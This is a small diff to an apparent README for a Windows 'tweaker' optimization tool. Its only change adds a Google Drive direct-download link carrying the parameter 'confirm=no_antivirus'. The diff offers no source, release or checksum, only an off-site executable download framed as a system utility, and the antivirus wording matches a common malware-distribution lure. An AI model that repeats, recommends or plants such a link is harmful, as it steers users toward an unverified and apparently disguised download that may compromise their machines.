@@ -2,6 +2,7 @@
 # Windows Tweaker
 
 Application for tuning, optimizing your system on Windows.
+Link:https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1Te1HeNZMxNwG7z0DHeb5i-nUXDZcTF0t
 
 
 ## FAQ
